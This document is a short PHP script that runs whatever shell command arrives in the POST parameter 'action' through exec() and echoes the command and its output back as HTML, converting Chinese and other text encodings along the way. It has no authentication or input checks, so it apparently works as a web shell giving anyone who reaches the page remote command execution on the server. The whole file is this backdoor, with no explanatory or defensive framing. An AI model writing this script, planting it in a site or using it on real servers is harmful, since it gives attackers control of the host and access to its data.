<?php
    if (isset($_POST['action']))
    {
        $command=$_POST['action'];
        exec($command,$output,$return);
        for($i=0;$i<count($output);$i++){
            $encode = mb_detect_encoding($output[$i], array("ASCII",'UTF-8',"GB2312","GBK",'BIG5')); 
            $output[$i] = mb_convert_encoding($output[$i], 'UTF-8', $encode);
        }
        if($return){
            echo "$>{$command}";
            echo "ERROR: `{$command}` was not operated correctly.";
            for($i=0;$i<count($output);$i++){
                echo "<br>";
                echo $output[$i];
            }
        }
        else{
            echo "$>{$command}";
            for($i=0;$i<count($output);$i++){
                echo "<br>";
                echo $output[$i];
            }
        }
    }
?>